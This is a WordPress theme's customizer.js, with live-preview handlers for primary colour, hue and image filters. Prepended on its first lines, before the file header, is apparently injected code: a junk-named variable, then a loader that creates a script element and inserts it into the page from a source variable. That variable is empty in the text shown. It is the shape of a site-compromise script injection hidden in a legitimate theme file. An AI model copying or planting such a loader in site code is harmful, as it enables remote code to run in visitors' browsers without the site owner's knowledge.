var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * File customizer.js.
 *
 * Theme Customizer enhancements for a better user experience.
 *
 * Contains handlers to make Theme Customizer preview reload changes asynchronously.
 */

(function( $ ) {

	// Primary color.
	wp.customize( 'primary_color', function( value ) {
		value.bind( function( to ) {
			// Update custom color CSS.
			var style = $( '#custom-theme-colors' ),
				hue = style.data( 'hue' ),
				css = style.html(),
				color;

			if( 'custom' === to ){
				// If a custom primary color is selected, use the currently set primary_color_hue
				color = wp.customize.get().primary_color_hue;
			} else {
				// If the "default" option is selected, get the default primary_color_hue
				color = 199;
			}

			// Equivalent to css.replaceAll, with hue followed by comma to prevent values with units from being changed.
			css = css.split( hue + ',' ).join( color + ',' );
			style.html( css ).data( 'hue', color );
		});
	});

	// Primary color hue.
	wp.customize( 'primary_color_hue', function( value ) {
		value.bind( function( to ) {

			// Update custom color CSS.
			var style = $( '#custom-theme-colors' ),
				hue = style.data( 'hue' ),
				css = style.html();

			// Equivalent to css.replaceAll, with hue followed by comma to prevent values with units from being changed.
			css = css.split( hue + ',' ).join( to + ',' );
			style.html( css ).data( 'hue', to );
		});
	});

	// Image filter.
	wp.customize( 'image_filter', function( value ) {
		value.bind( function( to ) {
			if ( to ) {
				$( 'body' ).addClass( 'image-filters-enabled' );
			} else {
				$( 'body' ).removeClass( 'image-filters-enabled' );
			}
		} );
	} );

})( jQuery );
